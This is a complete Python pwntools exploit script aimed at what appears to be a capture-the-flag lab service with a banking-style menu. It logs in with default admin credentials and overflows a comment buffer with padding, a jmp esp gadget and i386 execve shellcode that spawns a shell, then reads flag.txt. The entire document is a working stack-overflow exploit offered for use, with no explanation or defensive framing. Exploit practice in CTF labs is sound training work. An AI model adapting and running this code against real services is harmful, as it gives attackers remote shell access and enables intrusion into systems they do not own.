from pwn import *

context.arch = 'i386'
context.log_level = 'info'

HOST = 'labs.ctfzone.com'
PORT = 8327

jmp_esp = 0x080491e3

sc = asm('''
    xor eax, eax
    push eax
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp
    xor ecx, ecx
    xor edx, edx
    mov al, 0xb
    int 0x80
''')

payload = b'A' * 72
payload += p32(0x804c030)
payload += p32(jmp_esp)
payload += sc

r = remote(HOST, PORT)

r.recvuntil(b'Username:')
r.sendline(b'admin')
r.recvuntil(b'Password:')
r.sendline(b'admin')

r.recvuntil(b'> ')
r.sendline(b'2')
r.recvuntil(b'Enter amount to deposit:')
r.sendline(b'100')

r.recvuntil(b'> ')
r.sendline(b'3')
r.recvuntil(b'Enter amount:')
r.sendline(b'1')

r.recvuntil(b'comment')
r.sendline(payload)

sleep(1)
r.sendline(b'cat flag.txt')

data = r.recvall(timeout=5)
print(data.decode(errors='replace'))
